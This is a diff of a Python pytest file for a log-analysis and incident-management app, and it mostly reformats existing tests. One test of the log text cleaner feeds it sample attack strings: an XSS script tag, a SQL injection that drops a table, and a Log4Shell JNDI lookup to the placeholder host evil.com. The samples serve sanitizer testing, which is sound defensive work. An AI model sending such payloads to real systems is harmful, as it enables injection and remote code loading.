@@ -1,15 +1,23 @@
 """Quick tests to improve coverage for remaining modules."""
 
-import pytest
-from unittest.mock import patch, MagicMock
 from datetime import datetime
+from unittest.mock import MagicMock, patch
+
+import pytest
+
+from app.domain.entities import (
+    Incident,
+    IncidentSeverity,
+    IncidentStatus,
+    LogEntry,
+    LogLevel,
+)
+from app.domain.value_objects import AnomalyScore, MetricValue, SourceSystem
+from app.events.event_store import InMemoryEventStore
+from app.events.handlers import IncidentEventHandler, LogEventHandler, MLEventHandler
 
 # Import modules that need coverage
 from app.events.middleware import AuditMiddleware, LoggingMiddleware, MetricsMiddleware
-from app.events.event_store import InMemoryEventStore
-from app.events.handlers import LogEventHandler, IncidentEventHandler, MLEventHandler
-from app.domain.entities import LogEntry, LogLevel, Incident, IncidentSeverity, IncidentStatus
-from app.domain.value_objects import AnomalyScore, MetricValue, SourceSystem
 from app.infrastructure.ml.preprocessing.text_processor import LogTextProcessor
 
 
@@ -48,7 +56,7 @@ class TestMiddleware:
             nonlocal next_called
             next_called = True
 
-        with patch('app.events.middleware.logger') as mock_logger:
+        with patch("app.events.middleware.logger") as mock_logger:
             await middleware.process_event(event, next_middleware)
             mock_logger.info.assert_called()
             assert next_called
@@ -175,7 +183,7 @@ class TestDomainEntities:
             level=LogLevel.INFO,
             timestamp=datetime.now(),
             source="test",
-            metadata={"key": "value"}
+            metadata={"key": "value"},
         )
 
         assert entry.metadata["key"] == "value"
@@ -187,7 +195,7 @@ class TestDomainEntities:
             message="Error",
             level=LogLevel.ERROR,
             timestamp=datetime.now(),
-            source="test"
+            source="test",
         )
 
         info_entry = LogEntry(
@@ -195,7 +203,7 @@ class TestDomainEntities:
             message="Info",
             level=LogLevel.INFO,
             timestamp=datetime.now(),
-            source="test"
+            source="test",
         )
 
         assert error_entry.is_error_level()
@@ -212,7 +220,7 @@ class TestDomainEntities:
             created_at=datetime.now(),
             source="test",
             affected_systems=["system1", "system2"],
-            metadata={"key": "value"}
+            metadata={"key": "value"},
         )
 
         assert incident.title == "Test Incident"
@@ -228,7 +236,7 @@ class TestDomainEntities:
             severity=IncidentSeverity.MEDIUM,
             status=IncidentStatus.OPEN,
             created_at=datetime.now(),
-            source="test"
+            source="test",
         )
 
         closed_incident = Incident(
@@ -238,7 +246,7 @@ class TestDomainEntities:
             severity=IncidentSeverity.LOW,
             status=IncidentStatus.RESOLVED,
             created_at=datetime.now(),
-            source="test"
+            source="test",
         )
 
         assert open_incident.is_open()
@@ -254,7 +262,7 @@ class TestDomainEntities:
             severity=IncidentSeverity.CRITICAL,
             status=IncidentStatus.OPEN,
             created_at=datetime.now(),
-            source="test"
+            source="test",
         )
 
         assert high_incident.is_critical()
@@ -287,56 +295,36 @@ class TestValueObjects:
     def test_metric_value_normalization(self):
         """Test MetricValue normalization."""
         # Test percentage over 100%
-        high_percentage = MetricValue(
-            name="cpu_usage_percent",
-            value=150.0,
-            unit="%"
-        )
+        high_percentage = MetricValue(name="cpu_usage_percent", value=150.0, unit="%")
         normalized = high_percentage.normalize()
         assert normalized.value == 100.0
 
         # Test percentage under 1%
-        low_percentage = MetricValue(
-            name="success_rate_percent",
-            value=0.5,
-            unit="%"
-        )
+        low_percentage = MetricValue(name="success_rate_percent", value=0.5, unit="%")
         normalized = low_percentage.normalize()
         assert normalized.value == 1.0
 
     def test_metric_value_negative_allowed(self):
         """Test MetricValue with negative values where allowed."""
         # Temperature can be negative
-        temp_metric = MetricValue(
-            name="temperature_celsius",
-            value=-10.0,
-            unit="°C"
-        )
+        temp_metric = MetricValue(name="temperature_celsius", value=-10.0, unit="°C")
         assert temp_metric.value == -10.0
 
         # Balance can be negative
-        balance_metric = MetricValue(
-            name="account_balance",
-            value=-100.0,
-            unit="USD"
-        )
+        balance_metric = MetricValue(name="account_balance", value=-100.0, unit="USD")
         assert balance_metric.value == -100.0
 
     def test_source_system_identifiers(self):
         """Test SourceSystem identifier methods."""
         prod_system = SourceSystem(
-            name="api-server",
-            environment="production",
-            version="1.2.3"
+            name="api-server", environment="production", version="1.2.3"
         )
 
         assert prod_system.is_production()
         assert prod_system.full_identifier() == "api-server-production-1.2.3"
 
         dev_system = SourceSystem(
-            name="web-app",
-            environment="development",
-            version="0.1.0"
+            name="web-app", environment="development", version="0.1.0"
         )
 
         assert not dev_system.is_production()
@@ -383,11 +371,7 @@ class TestTextProcessorEdgeCases:
     def test_vocabulary_stats(self):
         """Test vocabulary statistics."""
         processor = LogTextProcessor(max_vocab_size=100)
-        processor.build_vocabulary([
-            "hello world",
-            "test message",
-            "another example"
-        ])
+        processor.build_vocabulary(["hello world", "test message", "another example"])
 
         stats = processor.get_vocab_stats()
 
@@ -403,13 +387,13 @@ class TestTextProcessorEdgeCases:
         processor = LogTextProcessor()
 
         # Test with multiple threat types in one message
-        complex_threat = '''
+        complex_threat = """
         <script>alert('xss')</script>
         javascript:void(0) 
         eval(malicious_code)
         SELECT * FROM users; DROP TABLE users;
         ${jndi:ldap://evil.com}
-        '''
+        """
 
         cleaned = processor.clean_log_message(complex_threat)
 
@@ -444,6 +428,7 @@ class TestTextProcessorEdgeCases:
 
         # Empty tensor
         import torch
+
         empty_tensor = torch.tensor([], dtype=torch.long)
         decoded = processor.decode_message(empty_tensor)
         assert decoded == ""
@@ -488,7 +473,7 @@ class TestCoverageHelpers:
             message="Test",
             level=LogLevel.INFO,
             timestamp=datetime.now(),
-            source="test"
+            source="test",
         )
 
         # Should have meaningful string representation
@@ -510,7 +495,7 @@ class TestCoverageHelpers:
         from app.core.interfaces import BaseRepository
 
         # Should be importable (even if not directly instantiable)
-        assert hasattr(BaseRepository, '__abstractmethods__')
+        assert hasattr(BaseRepository, "__abstractmethods__")
 
     def test_ml_service_private_methods(self):
         """Test MLService private methods if accessible."""
@@ -519,9 +504,9 @@ class TestCoverageHelpers:
         service = MLService()
 
         # Test batch size property
-        assert hasattr(service, 'batch_size')
+        assert hasattr(service, "batch_size")
         assert service.batch_size > 0
 
         # Test max sequence length property
-        assert hasattr(service, 'max_sequence_length')
+        assert hasattr(service, "max_sequence_length")
         assert service.max_sequence_length > 0
